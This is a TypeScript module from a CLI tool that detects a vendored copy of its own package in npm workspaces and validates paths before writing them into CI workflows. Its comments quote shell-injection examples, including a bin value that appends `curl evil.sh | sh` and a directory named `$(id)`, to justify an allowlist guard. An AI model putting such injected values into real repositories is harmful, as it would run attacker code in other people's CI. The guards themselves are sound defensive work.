// Self-hosting detection — "does the repo we are writing into vendor the
// vinaya CLI itself?"
//
// The failure this exists for (atta-labs/attalabs#929): in a repo whose root
// `package.json`
// `workspaces` glob reaches a member declaring the name `@attalabs/vinaya`,
// `npx --yes @attalabs/vinaya <cmd>` never contacts the registry. npm sees the
// name is satisfiable from the workspace and resolves that member's declared
// `bin` — `dist/index.js` — which does not exist until something builds it, so
// every generated CI job dies with `sh: vinaya: command not found`. **The
// decision is made on the package NAME, before the version spec is read**,
// which is why no spec form (`@0.4.6`, `--package=... --`) escapes it; pinning
// was measured and abandoned.
//
// So the predicate here is exactly the condition that triggers the
// misresolution — a workspace member named `@attalabs/vinaya` — and nothing
// more. A repo without one is an ordinary adopter and must keep the published
// `npx` invocation with no build step (constraint: adopters do not pay for
// this). A repo with one gets its OWN CLI built and invoked by path, which is
// also strictly better for it: its CI then exercises the code in the pull
// request rather than a published copy predating it.
//
// Detection runs at generation time (`init` / `upgrade` / `doctor` all hold the
// repo root), so the generated YAML stays free of branching logic. It is a
// pure function of the repo's on-disk workspace declaration, which is what
// `doctor`'s drift comparison needs — the same repo always regenerates the
// same bytes.

import { readdirSync, readFileSync, realpathSync } from 'node:fs'
import { join, sep } from 'node:path'

/** The published name whose presence in the workspace is what breaks `npx`. */
export const VINAYA_PACKAGE_NAME = '@attalabs/vinaya'

/** Fallback when the vendored member declares no usable `bin` entry. */
const DEFAULT_BIN = 'dist/index.js'

/** Pathological-glob backstop; real workspaces are nowhere near this. */
const MAX_CANDIDATE_DIRS = 2000

// Both `dir` and `bin` are interpolated into a workflow `run:` scalar as bare,
// unquoted shell words, and both originate in the *target repo's* package.json
// — content this CLI does not control. Without a check, a member directory
// named `$(id)`, or a `bin` of `dist/i.js; curl evil.sh | sh`, is written
// straight into the adopter's CI; a newline injects a whole additional step
// and the YAML still parses; and `${{ secrets.X }}` would be interpolated by
// Actions itself. So the emitted values are constrained to an allowlist rather
// than escaped: escaping has to be right every time, whereas a value outside
// this charset has no legitimate use as a workspace path.
//
// `null` — the ordinary-adopter shape — is the safe default, so a rejected
// value degrades to the published `npx` invocation instead of failing `init`.
// `@` is included because npm scopes are ordinary directory names: a member at
// `packages/@attalabs/vinaya` is legitimate, and `@` has no meaning to the
// shell. Excluding it would silently degrade exactly the repo this feature
// exists for, into the shape already known broken there.
const SAFE_PATH = /^[A-Za-z0-9@._-]+(?:\/[A-Za-z0-9@._-]+)*$/

/** True iff `p` is a repo-relative POSIX path safe to emit into a shell word. */
function isSafeRelPath(p: string): boolean {
  if (p.length === 0 || p.length > 255) return false
  if (!SAFE_PATH.test(p)) return false
  return p.split('/').every((s) => {
    // `.` and `..` rejected as whole segments only — a file named `..foo` or a
    // directory `v1.2` is legitimate and already matches SAFE_PATH.
    if (s === '.' || s === '..') return false
    // A leading `-` reaches `node`/`bun` in argument position, where a segment
    // named `-e` or `--eval` is read as an option rather than a path.
    //
    // It is not executable *in the shape this generator emits*, and the reason
    // is worth stating exactly, because it is the opposite of the intuitive
    // one. `node` ACCEPTS a detached value — `node -e 'code'` runs the code —
    // and REJECTS an attached one: `node -e/dist/index.js` is `node: bad
    // option`. The interpolated path is always a single argv token, so it can
    // only ever take the attached form, which dies. Were the invocation ever
    // rewritten to pass the path as a separate argument, this would become
    // arbitrary code execution rather than a parse error.
    //
    // So: rejected because no real directory needs it, and because the thing
    // standing between a parse error and `-e` is a property of the emitted
    // command that nothing else enforces.
    return !s.startsWith('-')
  })
}

export type VendoredVinaya = {
  /** Repo-relative POSIX dir of the workspace member, e.g. `apps/cli`. */
  dir: string
  /** Repo-relative POSIX path of its `vinaya` bin, e.g. `apps/cli/dist/index.js`. */
  bin: string
}

type PackageJson = {
  name?: unknown
  bin?: unknown
  workspaces?: unknown
}

function readPackageJson(path: string): PackageJson | null {
  try {
    const parsed: unknown = JSON.parse(readFileSync(path, 'utf-8'))
    return parsed && typeof parsed === 'object' ? (parsed as PackageJson) : null
  } catch {
    // Absent or unparseable — treated as "no workspace declaration", i.e. an
    // ordinary adopter. Detection never throws: a bad root package.json must
    // not take down `init`.
    return null
  }
}

/**
 * `workspaces` is either a bare array or `{ packages: [...] }` (the Yarn-1
 * object form npm and bun both still accept).
 */
function workspacePatterns(pkg: PackageJson | null): string[] {
  const raw = pkg?.workspaces
  const list = Array.isArray(raw)
    ? raw
    : raw && typeof raw === 'object' && Array.isArray((raw as { packages?: unknown }).packages)
      ? ((raw as { packages: unknown[] }).packages as unknown[])
      : []
  return list.filter((p): p is string => typeof p === 'string')
}

/** Directory children only, sorted, with `node_modules` and dotfiles skipped. */
function childDirs(absolute: string): string[] {
  try {
    return readdirSync(absolute, { withFileTypes: true })
      .filter((e) => e.isDirectory() && e.name !== 'node_modules' && !e.name.startsWith('.'))
      .map((e) => e.name)
      .sort()
  } catch {
    return []
  }
}

// Adjacent `[^/]*` groups make the compiled pattern backtrack badly: measured,
// `a****b` against a 255-char name costs 238ms, and `expandPattern` runs the
// matcher on every child before the candidate slice — a hundred siblings turn
// that into ~24s, a nested pattern into minutes. Detection is local-only (no
// registered check reaches this file), so it is a hang in `vinaya init`
// against a hostile clone rather than CI exposure. Still the worst failure
// mode available: no output, no diagnostic.
//
// Two defences, because the cap alone left the worst shape permitted. Runs of
// stars collapse first — `a****b` and `a*b` are the same glob, so collapsing
// is free and removes the adjacent-group case entirely. The cap then bounds
// what remains, where each group is separated by a literal that anchors the
// match. Real workspace patterns use one star, occasionally two.
const MAX_SEGMENT_STARS = 4

function segmentMatcher(segment: string): (name: string) => boolean {
  const collapsed = segment.replace(/\*+/g, '*')
  if (collapsed === '*') return () => true
  const parts = collapsed.split('*')
  // Refuse rather than risk the hang. A pattern this shaped is not a workspace
  // declaration anyone wrote by hand, and matching nothing degrades to the
  // ordinary-adopter shape — the same safe default the path guard uses.
  if (parts.length - 1 > MAX_SEGMENT_STARS) return () => false
  const source = parts.map((part) => part.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')).join('[^/]*')
  const re = new RegExp(`^${source}$`)
  return (name) => re.test(name)
}

/**
 * Expand one workspace pattern into repo-relative candidate dirs. Wildcards are
 * matched a segment at a time; `**` is treated as a single level, which covers
 * every workspace layout npm/bun actually ship with (`apps/*`, `packages/*`)
 * without walking an unbounded tree.
 */
function expandPattern(repoRoot: string, pattern: string): string[] {
  const segments = pattern.split('/').filter((s) => s.length > 0 && s !== '.')
  if (segments.length === 0) return []

  let dirs: string[] = ['']
  for (const segment of segments) {
    const next: string[] = []
    for (const dir of dirs) {
      if (segment.includes('*')) {
        const matches = segmentMatcher(segment)
        for (const name of childDirs(join(repoRoot, dir))) {
          if (matches(name)) next.push(dir ? `${dir}/${name}` : name)
        }
      } else {
        next.push(dir ? `${dir}/${segment}` : segment)
      }
    }
    dirs = next.slice(0, MAX_CANDIDATE_DIRS)
  }
  return dirs
}

/**
 * True iff `rel` resolves, through symlinks, to somewhere inside `repoRoot`.
 *
 * The `..`-segment rule in `isSafeRelPath` only rejects traversal spelled out
 * in the path. It does not see a LITERAL (non-wildcard) workspace segment that
 * is a symlink pointing outside the repo — `workspaces: ["vendored"]` with
 * `vendored -> /elsewhere` produces the clean relative path `vendored`, which
 * passes every textual check while naming a directory the repo does not
 * contain. The wildcard path is already safe (`Dirent.isDirectory()` is false
 * for a symlink), so this closes the one remaining route.
 *
 * Failure to resolve — a broken link, a missing directory, a permissions
 * error — is treated as "not contained", matching the module's fail-closed
 * default rather than trusting an unreadable path.
 */
function resolvesInsideRepo(repoRoot: string, rel: string): boolean {
  try {
    const root = realpathSync(repoRoot)
    const target = realpathSync(join(repoRoot, rel))
    return target === root || target.startsWith(`${root}${sep}`)
  } catch {
    return false
  }
}

/** Resolve the member's `vinaya` bin path, relative to the member's own dir. */
function binPath(pkg: PackageJson): string {
  const bin = pkg.bin
  if (typeof bin === 'string') return bin.replace(/^\.\//, '')
  if (bin && typeof bin === 'object') {
    const named = (bin as Record<string, unknown>).vinaya
    if (typeof named === 'string') return named.replace(/^\.\//, '')
  }
  return DEFAULT_BIN
}

/**
 * The workspace member declaring `@attalabs/vinaya`, or `null` for the ordinary
 * adopter. Never throws — every read failure degrades to `null`.
 */
export function detectVendoredVinaya(repoRoot: string): VendoredVinaya | null {
  const patterns = workspacePatterns(readPackageJson(join(repoRoot, 'package.json')))
  const seen = new Set<string>()
  for (const pattern of patterns) {
    for (const dir of expandPattern(repoRoot, pattern)) {
      if (seen.has(dir)) continue
      seen.add(dir)
      const member = readPackageJson(join(repoRoot, dir, 'package.json'))
      if (member?.name === VINAYA_PACKAGE_NAME) {
        const bin = `${dir}/${binPath(member)}`
        // Refuse rather than emit: an unsafe dir or bin would be written into
        // the adopter's CI as a bare shell word. Falling back to the ordinary
        // `npx` shape is wrong for this repo but harmless, which is the right
        // way round.
        if (!isSafeRelPath(dir) || !isSafeRelPath(bin)) return null
        // Textual safety is not containment: a literal workspace segment that
        // is a symlink out of the repo yields a clean relative path.
        //
        // Applied to `dir` and NOT to `bin`, and the asymmetry is forced
        // rather than chosen: at generation time the bin does not exist yet
        // — it is built in CI — so resolving it would throw, degrade to
        // `false`, and refuse every legitimate vendoring repo. Do not
        // "complete" this check without moving detection after the build.
        // The gap it leaves is narrow: an actor able to commit a symlinked
        // bin can already commit the build script the job runs first.
        if (!resolvesInsideRepo(repoRoot, dir)) return null
        return { dir, bin }
      }
    }
  }
  return null
}
